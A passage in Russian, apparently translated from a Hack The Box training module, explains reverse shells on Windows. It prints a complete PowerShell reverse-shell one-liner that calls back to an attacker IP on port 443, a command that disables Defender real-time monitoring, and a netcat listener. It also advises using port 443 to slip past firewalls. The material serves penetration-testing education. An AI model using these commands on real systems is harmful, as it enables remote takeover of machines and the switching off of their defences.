При использовании такого `reverse shell`механизма в атакуемой системе будет запущен обработчик событий, и целевому объекту потребуется инициировать соединение.

Команда для создания reverse shell windows

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Отключение Defender если не дает запустить Reverse Shell

```
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Мы часто будем использовать подобную оболочку, сталкиваясь с уязвимыми системами, поскольку администратор, скорее всего, проигнорирует исходящие соединения, что даст нам больше шансов остаться незамеченными. В предыдущем разделе обсуждалось, как оболочки bind зависят от входящих соединений, разрешенных брандмауэром на стороне сервера. В реальных условиях реализовать это будет гораздо сложнее. Как показано на изображении выше, мы запускаем прослушиватель для обратной оболочки на нашем атакующем компьютере и используем какой-либо метод (например, `Unrestricted File Upload`, `Command Injection`, и т. д.), чтобы заставить целевой компьютер инициировать соединение с нашим целевым компьютером, что фактически означает, что наш атакующий компьютер становится сервером, а целевой — клиентом.

Нам не всегда нужно изобретать велосипед, когда дело доходит до полезных нагрузок (команд и кода), которые мы собираемся использовать при попытке установить обратную оболочку с целью. Существуют полезные инструменты, разработанные ветеранами информационной безопасности, чтобы помочь нам. « [Шпаргалка по обратной оболочке»](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) — это отличный ресурс, содержащий список различных команд, кода и даже автоматических генераторов обратной оболочки, которые мы можем использовать во время тренировок или в реальных ситуациях. Следует помнить, что многие администраторы знают о общедоступных репозиториях и ресурсах с открытым исходным кодом, которые обычно используют специалисты по тестированию на проникновение. Они могут ссылаться на эти репозитории как на один из основных факторов, которые следует учитывать при оценке атаки, и соответствующим образом корректировать свои средства контроля безопасности. В некоторых случаях нам может потребоваться немного адаптировать наши атаки.

Давайте поработаем над этим на практике, чтобы лучше понять эти концепты.

## Практическое занятие по созданию простой обратной оболочки в Windows.

В этом пошаговом руководстве мы создадим простую обратную оболочку с помощью кода PowerShell на целевом устройстве под управлением Windows. Давайте запустим целевое устройство и начнём.

Мы можем запустить прослушиватель Netcat на нашем сервере атаки, как только появится цель.

#### Сервер ( `attack box`)

        shellsession
`MuraMitchi@htb[/htb]$ sudo nc -lvnp 443 Listening on 0.0.0.0 443`

В этот раз, используя наш слушатель, мы привязываем его к [общему порту](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) ( `443`), который обычно используется для `HTTPS`соединений. Использование таких общих портов может быть полезно, поскольку при установлении соединения с слушателем мы хотим гарантировать, что исходящий трафик не будет заблокирован брандмауэром операционной системы и на сетевом уровне. Редко можно увидеть, чтобы какая-либо команда безопасности блокировала исходящий трафик через порт 443, поскольку многие приложения и организации используют HTTPS для доступа к различным веб-сайтам в течение рабочего дня. Тем не менее, брандмауэр, способный к глубокому анализу пакетов и видимости на уровне 7, может обнаружить и остановить обратную оболочку, исходящую через общий порт, поскольку он анализирует содержимое сетевых пакетов, а не только IP-адрес и порт. Подробное рассмотрение обхода брандмауэра выходит за рамки этого модуля, поэтому мы лишь кратко затронем методы обнаружения и обхода в рамках модуля, а также в специальном разделе в конце.

После запуска целевого сервера Windows давайте подключимся с помощью RDP.

Netcat можно использовать для запуска обратной оболочки на стороне Windows, но следует учитывать, какие приложения уже установлены в системе. Netcat не является встроенным инструментом Windows, поэтому его использование на стороне Windows может быть ненадежным. В последующем разделе мы увидим, что для использования Netcat в Windows необходимо перенести исполняемый файл Netcat на целевой компьютер, что может быть сложно, если изначально отсутствуют возможности загрузки файлов. Тем не менее, в идеале следует использовать встроенные инструменты (доступные извне) целевого компьютера, к которому мы пытаемся получить доступ.

Для иллюстрации этого момента мы можем использовать стандартную однострочную команду обратной оболочки PowerShell.

На целевом устройстве под управлением Windows откройте командную строку и скопируйте и вставьте следующую команду:

Примечание: Если вы используете Pwnbox, имейте в виду, что некоторые браузеры не так хорошо работают с функцией буфера обмена для прямой вставки команды в командную строку целевого устройства. В таких случаях может потребоваться вставить команду в Блокнот на целевом устройстве, а затем скопировать и вставить ее изнутри целевого устройства.

Доставка этой полезной нагрузки в систему Windows была довольно простой, учитывая, что для демонстрационных целей у нас есть полный контроль над целевым объектом. По мере прохождения этого модуля мы заметим, как возрастает сложность доставки полезной нагрузки на целевые объекты.
